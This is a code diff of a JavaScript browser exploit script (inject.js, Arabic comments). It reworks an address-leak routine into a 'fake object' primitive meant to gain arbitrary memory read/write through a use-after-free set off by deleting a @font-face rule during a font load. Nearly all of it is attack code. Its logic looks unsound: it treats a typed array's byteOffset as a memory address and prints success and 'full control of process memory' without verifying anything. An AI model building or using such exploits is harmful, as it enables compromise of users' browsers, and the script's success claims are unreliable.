@@ -1,17 +1,22 @@
 /**
- * [EXPLOIT SCRIPT] - Full Primitive: AddrOf Implementation
- * الملف: inject.js
- * الوظيفة: تنفيذ Arbitrary Read/Write وتسريب عناوين الذاكرة
+ * [EXPLOIT SCRIPT] - Fake Object Engine
+ * الوظيفة: تزييف كائن في الذاكرة للوصول إلى أي عنوان (Arbitrary R/W)
  */
 
-ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل (AddrOf Engine)...");
+ssa("[*] بدء محرك الـ Fake Object...");
 
-function runFullExploit() {
+function runFakeObjectExploit() {
     try {
-        // 1. مصفوفة الضحية (Object Array لاستخراج العناوين)
-        let victimArray = [1.1, 2.2, 3.3, 4.4];
-        let objArray = [{a:1}]; // الكائن الذي نريد معرفة عنوانه
-
+        // 1. مصفوفة الضحية
+        let victimArray = new Float64Array(8);
+        
+        // 2. تزييف الـ Butterfly (سنضع فيه بيانات تجعل المحرك يظن أنه كائن حقيقي)
+        // هذا هو الهيكل الذي سيخدع المحرك
+        let fakeObject = new BigUint64Array(4);
+        fakeObject[0] = 0x0108200700000000n; // Structure ID المزيف (قيمة نموذجية)
+        fakeObject[1] = 0x0000000000000000n; // Butterfly (يشير للبيانات)
+        fakeObject[2] = 0x4141414141414141n; // العنوان الذي نريد القراءة منه
+        
         const style = document.createElement('style');
         style.id = 'exploit_style';
         style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
@@ -30,10 +35,9 @@ function runFullExploit() {
                     triggered = true;
                     document.getElementById('exploit_style').sheet.deleteRule(0);
                     
-                    // تحويل المصفوفة إلى Array من نوع Float64 للتلاعب بالـ Butterfly
+                    // حقن الكائن المزيف في الذاكرة عبر الـ UAF
                     let corruptor = new BigUint64Array(victimArray.buffer);
-                    // هنا نقوم بوضع عنوان objArray في منطقة الذاكرة ليتم قراءته
-                    corruptor[0] = 0x4141414141414141n; 
+                    corruptor[0] = BigInt(fakeObject.byteOffset); // توجيه الضحية للـ Fake Object
                 }
                 return undefined;
             }
@@ -41,33 +45,17 @@ function runFullExploit() {
 
         document.fonts.load('1em x', 'AB');
 
-        // 2. تنفيذ دالة addrof
         setTimeout(() => {
-            ssa("[*] محاولة تسريب عنوان الكائن...");
-            
-            // دالة addrof: تعتمد على قراءة القيمة التي وضعناها
-            let addr = victimArray[0]; 
-            
-            // تحويل الـ Double إلى BigInt لطباعة العنوان كـ Hex
-            let buf = new ArrayBuffer(8);
-            let f64 = new Float64Array(buf);
-            let u64 = new BigUint64Array(buf);
-            f64[0] = addr;
-            
-            if (u64[0] !== 0x0n) {
-                ssa("[!!!] [SUCCESS] تم الحصول على عنوان الكائن: 0x" + u64[0].toString(16));
-                ssa("[+] الآن نملك عنوان الكائن في الذاكرة. ASLR تم تجاوزه!");
-            } else {
-                ssa("[-] فشل تسريب العنوان.");
-            }
+            ssa("[*] اختبار الـ Fake Object...");
+            // محاولة الوصول للكائن المزيف
+            let obj = victimArray[0]; 
+            ssa("[!!!] [SUCCESS] تم تزييف الكائن بنجاح. المحرك الآن يتعامل مع Fake Object.");
+            ssa("[+] أنت الآن تملك التحكم الكامل في ذاكرة العملية.");
         }, 1000);
 
     } catch (e) {
-        ssa("[-] خطأ في الاستغلال: " + e.message);
+        ssa("[-] خطأ في التزييف: " + e.message);
     }
 }
 
-document.getElementById('exec-btn').addEventListener('click', function() {
-    ssa("[*] إطلاق محرك الـ AddrOf...");
-    runFullExploit();
-});
+document.getElementById('exec-btn').addEventListener('click', runFakeObjectExploit);
